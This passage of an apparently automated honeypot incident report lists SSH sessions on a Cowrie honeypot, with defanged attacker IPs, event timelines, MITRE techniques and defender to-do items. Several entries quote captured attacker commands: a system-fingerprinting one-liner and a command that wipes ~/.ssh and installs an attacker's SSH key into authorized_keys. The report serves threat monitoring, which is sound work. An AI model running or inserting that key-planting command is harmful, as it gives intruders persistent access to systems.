|---|---|
| **Source IP** | `203.129.217[.]70` |
| **First Seen** | 2026-07-13 04:18 |
| **Last Seen** | 2026-07-13 04:19 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 04:18:51` | `cowrie.session.connect` |
| `2026-07-13 04:18:53` | `cowrie.client.version` |
| `2026-07-13 04:18:53` | `cowrie.client.kex` |
| `2026-07-13 04:18:59` | `cowrie.login.success` |
| `2026-07-13 04:19:01` | `cowrie.direct-tcpip.request` |
| `2026-07-13 04:19:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.129.217[.]70` to AbuseIPDB if not already reported
- [ ] Block `203.129.217[.]70` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-beb296c35530

| Field | Detail |
|---|---|
| **Source IP** | `122.187.147[.]13` |
| **First Seen** | 2026-07-13 04:21 |
| **Last Seen** | 2026-07-13 04:22 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 04:21:51` | `cowrie.session.connect` |
| `2026-07-13 04:21:52` | `cowrie.client.version` |
| `2026-07-13 04:21:52` | `cowrie.client.kex` |
| `2026-07-13 04:21:55` | `cowrie.login.success` |
| `2026-07-13 04:21:55` | `cowrie.direct-tcpip.request` |
| `2026-07-13 04:22:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.147[.]13` to AbuseIPDB if not already reported
- [ ] Block `122.187.147[.]13` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23f78a677048

| Field | Detail |
|---|---|
| **Source IP** | `196.28.226[.]66` |
| **First Seen** | 2026-07-13 04:22 |
| **Last Seen** | 2026-07-13 04:22 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 04:22:03` | `cowrie.session.connect` |
| `2026-07-13 04:22:04` | `cowrie.client.version` |
| `2026-07-13 04:22:04` | `cowrie.client.kex` |
| `2026-07-13 04:22:06` | `cowrie.login.success` |
| `2026-07-13 04:22:07` | `cowrie.direct-tcpip.request` |
| `2026-07-13 04:22:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.28.226[.]66` to AbuseIPDB if not already reported
- [ ] Block `196.28.226[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc6d1c0cd902

| Field | Detail |
|---|---|
| **Source IP** | `167.99.72[.]161` |
| **First Seen** | 2026-07-13 04:23 |
| **Last Seen** | 2026-07-13 04:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 04:23:29` | `cowrie.session.connect` |
| `2026-07-13 04:23:29` | `cowrie.client.version` |
| `2026-07-13 04:23:30` | `cowrie.client.kex` |
| `2026-07-13 04:23:30` | `cowrie.login.success` |
| `2026-07-13 04:23:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.99.72[.]161` to AbuseIPDB if not already reported
- [ ] Block `167.99.72[.]161` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd9c7a0ea843

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-13 04:23 |
| **Last Seen** | 2026-07-13 04:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 04:23:31` | `cowrie.session.connect` |
| `2026-07-13 04:23:31` | `cowrie.client.version` |
| `2026-07-13 04:23:31` | `cowrie.client.kex` |
| `2026-07-13 04:23:31` | `cowrie.login.success` |
| `2026-07-13 04:23:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-892d89c0d4f3

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-13 04:26 |
| **Last Seen** | 2026-07-13 04:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 04:26:42` | `cowrie.session.connect` |
| `2026-07-13 04:26:42` | `cowrie.client.version` |
| `2026-07-13 04:26:42` | `cowrie.client.kex` |
| `2026-07-13 04:26:42` | `cowrie.login.success` |
| `2026-07-13 04:26:42` | `cowrie.direct-tcpip.request` |
| `2026-07-13 04:26:42` | `cowrie.direct-tcpip.data` |
| `2026-07-13 04:26:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-510c255d6ba3

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-13 04:28 |
| **Last Seen** | 2026-07-13 04:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 04:28:21` | `cowrie.session.connect` |
| `2026-07-13 04:28:21` | `cowrie.client.version` |
| `2026-07-13 04:28:21` | `cowrie.client.kex` |
| `2026-07-13 04:28:21` | `cowrie.login.success` |
| `2026-07-13 04:28:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b30e230a2e3b

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-13 04:28 |
| **Last Seen** | 2026-07-13 04:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 04:28:21` | `cowrie.session.connect` |
| `2026-07-13 04:28:21` | `cowrie.client.version` |
| `2026-07-13 04:28:21` | `cowrie.client.kex` |
| `2026-07-13 04:28:21` | `cowrie.login.success` |
| `2026-07-13 04:28:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b55699c2aca3

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-13 04:28 |
| **Last Seen** | 2026-07-13 04:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 04:28:22` | `cowrie.session.connect` |
| `2026-07-13 04:28:22` | `cowrie.client.version` |
| `2026-07-13 04:28:22` | `cowrie.client.kex` |
| `2026-07-13 04:28:23` | `cowrie.login.success` |
| `2026-07-13 04:28:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d176fd90e9fe

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-13 04:28 |
| **Last Seen** | 2026-07-13 04:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 04:28:23` | `cowrie.session.connect` |
| `2026-07-13 04:28:23` | `cowrie.client.version` |
| `2026-07-13 04:28:23` | `cowrie.client.kex` |
| `2026-07-13 04:28:24` | `cowrie.login.success` |
| `2026-07-13 04:28:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-624812772053

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-13 04:28 |
| **Last Seen** | 2026-07-13 04:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 04:28:50` | `cowrie.session.connect` |
| `2026-07-13 04:28:50` | `cowrie.client.version` |
| `2026-07-13 04:28:50` | `cowrie.client.kex` |
| `2026-07-13 04:28:52` | `cowrie.login.success` |
| `2026-07-13 04:28:53` | `cowrie.session.params` |
| `2026-07-13 04:28:53` | `cowrie.command.input` |
| `2026-07-13 04:28:53` | `cowrie.log.closed` |
| `2026-07-13 04:28:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c76b4bfbb62

| Field | Detail |
|---|---|
| **Source IP** | `117.70.94[.]155` |
| **First Seen** | 2026-07-13 04:37 |
| **Last Seen** | 2026-07-13 04:37 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 04:37:30` | `cowrie.session.connect` |
| `2026-07-13 04:37:31` | `cowrie.client.version` |
| `2026-07-13 04:37:31` | `cowrie.client.kex` |
| `2026-07-13 04:37:35` | `cowrie.login.success` |
| `2026-07-13 04:37:36` | `cowrie.direct-tcpip.request` |
| `2026-07-13 04:37:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.70.94[.]155` to AbuseIPDB if not already reported
- [ ] Block `117.70.94[.]155` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-891a74742d20

| Field | Detail |
|---|---|
| **Source IP** | `74.208.177[.]56` |
| **First Seen** | 2026-07-13 04:41 |
| **Last Seen** | 2026-07-13 04:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 04:41:45` | `cowrie.session.connect` |
| `2026-07-13 04:41:46` | `cowrie.client.version` |
| `2026-07-13 04:41:46` | `cowrie.client.kex` |
| `2026-07-13 04:41:47` | `cowrie.login.success` |
| `2026-07-13 04:41:48` | `cowrie.direct-tcpip.request` |
| `2026-07-13 04:41:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.208.177[.]56` to AbuseIPDB if not already reported
- [ ] Block `74.208.177[.]56` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ae37b7e51bd

| Field | Detail |
|---|---|
| **Source IP** | `47.252.16[.]44` |
| **First Seen** | 2026-07-13 04:42 |
| **Last Seen** | 2026-07-13 04:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 04:42:57` | `cowrie.session.connect` |
| `2026-07-13 04:42:57` | `cowrie.client.version` |
| `2026-07-13 04:42:57` | `cowrie.client.kex` |
| `2026-07-13 04:42:57` | `cowrie.login.success` |
| `2026-07-13 04:42:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.252.16[.]44` to AbuseIPDB if not already reported
- [ ] Block `47.252.16[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58c6a491a4d6

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-13 04:42 |
| **Last Seen** | 2026-07-13 04:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 04:42:57` | `cowrie.session.connect` |
| `2026-07-13 04:42:57` | `cowrie.client.version` |
| `2026-07-13 04:42:57` | `cowrie.client.kex` |
| `2026-07-13 04:42:57` | `cowrie.login.success` |
| `2026-07-13 04:42:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-354a332b7088

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-13 04:46 |
| **Last Seen** | 2026-07-13 04:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 04:46:55` | `cowrie.session.connect` |
| `2026-07-13 04:46:55` | `cowrie.client.version` |
| `2026-07-13 04:46:55` | `cowrie.client.kex` |
| `2026-07-13 04:46:55` | `cowrie.login.success` |
| `2026-07-13 04:46:56` | `cowrie.session.params` |
| `2026-07-13 04:46:56` | `cowrie.command.input` |
| `2026-07-13 04:46:56` | `cowrie.log.closed` |
| `2026-07-13 04:46:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bfda608fdce

| Field | Detail |
|---|---|
| **Source IP** | `65.20.204[.]41` |
| **First Seen** | 2026-07-13 04:48 |
| **Last Seen** | 2026-07-13 04:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 04:48:10` | `cowrie.session.connect` |
| `2026-07-13 04:48:10` | `cowrie.client.version` |
| `2026-07-13 04:48:10` | `cowrie.client.kex` |
| `2026-07-13 04:48:11` | `cowrie.login.success` |
| `2026-07-13 04:48:12` | `cowrie.direct-tcpip.request` |
| `2026-07-13 04:48:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.204[.]41` to AbuseIPDB if not already reported
- [ ] Block `65.20.204[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be942a534f53

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-13 04:54 |
| **Last Seen** | 2026-07-13 04:54 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 04:54:21` | `cowrie.session.connect` |
| `2026-07-13 04:54:21` | `cowrie.client.version` |
| `2026-07-13 04:54:21` | `cowrie.client.kex` |
| `2026-07-13 04:54:23` | `cowrie.login.success` |
| `2026-07-13 04:54:25` | `cowrie.session.params` |
| `2026-07-13 04:54:25` | `cowrie.command.input` |
| `2026-07-13 04:54:25` | `cowrie.command.input` |
| `2026-07-13 04:54:25` | `cowrie.command.input` |
| `2026-07-13 04:54:25` | `cowrie.command.input` |
| `2026-07-13 04:54:25` | `cowrie.command.input` |
| `2026-07-13 04:54:25` | `cowrie.command.success` |
| `2026-07-13 04:54:25` | `cowrie.command.input` |
| `2026-07-13 04:54:25` | `cowrie.command.input` |
| `2026-07-13 04:54:25` | `cowrie.command.input` |
| `2026-07-13 04:54:25` | `cowrie.command.input` |
| `2026-07-13 04:54:26` | `cowrie.log.closed` |
| `2026-07-13 04:54:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81bb2ac6bf9f

| Field | Detail |
|---|---|
| **Source IP** | `103.97.101[.]25` |
| **First Seen** | 2026-07-13 04:54 |
| **Last Seen** | 2026-07-13 04:55 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 04:54:45` | `cowrie.session.connect` |
| `2026-07-13 04:54:45` | `cowrie.client.version` |
| `2026-07-13 04:54:45` | `cowrie.client.kex` |
| `2026-07-13 04:54:49` | `cowrie.login.success` |
| `2026-07-13 04:54:51` | `cowrie.session.params` |
| `2026-07-13 04:54:51` | `cowrie.command.input` |
| `2026-07-13 04:54:51` | `cowrie.command.failed` |
| `2026-07-13 04:54:51` | `cowrie.log.closed` |
| `2026-07-13 04:54:53` | `cowrie.session.params` |
| `2026-07-13 04:54:53` | `cowrie.command.input` |
| `2026-07-13 04:54:53` | `cowrie.session.file_download` |
| `2026-07-13 04:54:53` | `cowrie.log.closed` |
| `2026-07-13 04:55:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.97.101[.]25` to AbuseIPDB if not already reported
- [ ] Block `103.97.101[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9226ff69a93c

| Field | Detail |
|---|---|
| **Source IP** | `103.97.101[.]25` |
| **First Seen** | 2026-07-13 04:54 |
| **Last Seen** | 2026-07-13 04:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 04:54:53` | `cowrie.session.connect` |
| `2026-07-13 04:54:53` | `cowrie.client.version` |
| `2026-07-13 04:54:53` | `cowrie.client.kex` |
| `2026-07-13 04:54:55` | `cowrie.login.success` |
| `2026-07-13 04:54:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.97.101[.]25` to AbuseIPDB if not already reported
- [ ] Block `103.97.101[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f566c98ca82

| Field | Detail |
|---|---|
| **Source IP** | `103.97.101[.]25` |
| **First Seen** | 2026-07-13 04:54 |
| **Last Seen** | 2026-07-13 04:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 04:54:55` | `cowrie.session.connect` |
| `2026-07-13 04:54:55` | `cowrie.client.version` |
| `2026-07-13 04:54:56` | `cowrie.client.kex` |
| `2026-07-13 04:55:03` | `cowrie.login.success` |
| `2026-07-13 04:55:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.97.101[.]25` to AbuseIPDB if not already reported
- [ ] Block `103.97.101[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64e66edc0eff

| Field | Detail |
|---|---|
| **Source IP** | `102.210.149[.]236` |
| **First Seen** | 2026-07-13 04:55 |
| **Last Seen** | 2026-07-13 04:55 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 04:55:02` | `cowrie.session.connect` |
| `2026-07-13 04:55:02` | `cowrie.client.version` |
| `2026-07-13 04:55:02` | `cowrie.client.kex` |
| `2026-07-13 04:55:03` | `cowrie.login.success` |
| `2026-07-13 04:55:05` | `cowrie.session.params` |
| `2026-07-13 04:55:05` | `cowrie.command.input` |
| `2026-07-13 04:55:05` | `cowrie.command.failed` |
| `2026-07-13 04:55:06` | `cowrie.log.closed` |
| `2026-07-13 04:55:07` | `cowrie.session.params` |
| `2026-07-13 04:55:07` | `cowrie.command.input` |
| `2026-07-13 04:55:07` | `cowrie.session.file_download` |
| `2026-07-13 04:55:07` | `cowrie.log.closed` |
| `2026-07-13 04:55:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.149[.]236` to AbuseIPDB if not already reported
- [ ] Block `102.210.149[.]236` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1de4a9fb62d

| Field | Detail |
|---|---|
| **Source IP** | `102.210.149[.]236` |
| **First Seen** | 2026-07-13 04:55 |
| **Last Seen** | 2026-07-13 04:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 04:55:07` | `cowrie.session.connect` |
| `2026-07-13 04:55:07` | `cowrie.client.version` |
| `2026-07-13 04:55:07` | `cowrie.client.kex` |
| `2026-07-13 04:55:09` | `cowrie.login.success` |
| `2026-07-13 04:55:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.149[.]236` to AbuseIPDB if not already reported
- [ ] Block `102.210.149[.]236` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2414c58ef49f

| Field | Detail |
|---|---|
| **Source IP** | `102.210.149[.]236` |
| **First Seen** | 2026-07-13 04:55 |
| **Last Seen** | 2026-07-13 04:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 04:55:09` | `cowrie.session.connect` |
| `2026-07-13 04:55:09` | `cowrie.client.version` |
| `2026-07-13 04:55:10` | `cowrie.client.kex` |
| `2026-07-13 04:55:11` | `cowrie.login.success` |
| `2026-07-13 04:55:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.149[.]236` to AbuseIPDB if not already reported
- [ ] Block `102.210.149[.]236` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1444914ff832

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-13 04:55 |
| **Last Seen** | 2026-07-13 04:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 04:55:15` | `cowrie.session.connect` |
| `2026-07-13 04:55:15` | `cowrie.client.version` |
| `2026-07-13 04:55:15` | `cowrie.client.kex` |
| `2026-07-13 04:55:16` | `cowrie.login.success` |
| `2026-07-13 04:55:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

